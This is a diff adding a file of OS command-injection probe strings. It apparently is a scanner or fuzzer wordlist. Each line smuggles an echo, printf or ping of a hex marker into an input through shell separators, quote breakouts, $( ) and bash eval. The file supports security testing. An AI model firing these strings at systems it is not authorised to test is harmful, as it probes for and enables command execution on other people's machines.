@@ -1,0 +1,258 @@
+; echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"; 
+; echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"; 
+; echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1; 
+; echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1; 
+ && false || echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" && 
+ && false || echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" && 
+ && false || echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1 && 
+ && false || echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1 && 
+"; echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"; "
+"; echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"; "
+'; echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"; '
+'; echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"; '
+"; echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1; "
+"; echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1; "
+'; echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1; '
+'; echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1; '
+echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"
+echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"
+bash -c "$@" x eval echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37";
+bash -c "$@" x eval echo -e "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37";
+; printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"; 
+; printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"; 
+; printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1; 
+; printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1; 
+ && false || printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" && 
+ && false || printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" && 
+ && false || printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1 && 
+ && false || printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1 && 
+"; printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"; "
+"; printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"; "
+'; printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"; '
+'; printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"; '
+"; printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1; "
+"; printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1; "
+'; printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1; '
+'; printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37" 2>&1; '
+printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"
+printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37"
+bash -c "$@" x eval printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37";
+bash -c "$@" x eval printf "\\x61\\x39\\x38\\x32\\x37\\x62\\x35\\x33\\x30\\x36\\x30\\x30\\x33\\x39\\x64\\x34\\x34\\x38\\x36\\x63\\x31\\x66\\x66\\x65\\x37\\x34\\x30\\x35\\x31\\x34\\x64\\x63\\x65\\x38\\x65\\x34\\x33\\x64\\x35\\x37\\x38\\x61\\x35\\x36\\x35\\x33\\x63\\x61\\x35\\x63\\x62\\x66\\x66\\x64\\x64\\x35\\x30\\x64\\x66\\x35\\x38\\x35\\x33\\x37";
+; printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7; 
+; printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7; 
+; printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7 2>&1; 
+; printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7 2>&1; 
+ && false || printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7 && 
+ && false || printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7 && 
+ && false || printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7 2>&1 && 
+ && false || printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7 2>&1 && 
+"; printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7; "
+"; printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7; "
+'; printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7; '
+'; printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7; '
+"; printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7 2>&1; "
+"; printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7 2>&1; "
+'; printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7 2>&1; '
+'; printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7 2>&1; '
+printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7
+printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7
+bash -c "$@" x eval printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7;
+bash -c "$@" x eval printf \a\9\8\2\7\b\5\3\0\6\0\0\3\9\d\4\4\8\6\c\1\f\f\e\7\4\0\5\1\4\d\c\e\8\e\4\3\d\5\7\8\a\5\6\5\3\c\a\5\c\b\f\f\d\d\5\0\d\f\5\8\5\3\7;
+ & echo ^a^9^8^2^7^b^5^3^0^6^0^0^3^9^d^4^4^8^6^c^1^f^f^e^7^4^0^5^1^4^d^c^e^8^e^4^3^d^5^7^8^a^5^6^5^3^c^a^5^c^b^f^f^d^d^5^0^d^f^5^8^5^3^7 & 
+ & echo ^a^9^8^2^7^b^5^3^0^6^0^0^3^9^d^4^4^8^6^c^1^f^f^e^7^4^0^5^1^4^d^c^e^8^e^4^3^d^5^7^8^a^5^6^5^3^c^a^5^c^b^f^f^d^d^5^0^d^f^5^8^5^3^7 & 
+; ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; 
+; ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; 
+; ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; 
+; ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; 
+ && false || ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 && 
+ && false || ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 && 
+ && false || ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1 && 
+ && false || ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1 && 
+"; ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; "
+"; ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; "
+'; ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; '
+'; ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537; '
+"; ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; "
+"; ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; "
+'; ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; '
+'; ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537 2>&1; '
+ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537
+ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537
+bash -c "$@" x eval ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537;
+bash -c "$@" x eval ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537;
+$(ping -c 1 a9827b53060039d4486c1ffe740514dce8e43d578a5653ca5cbffdd50df58537)
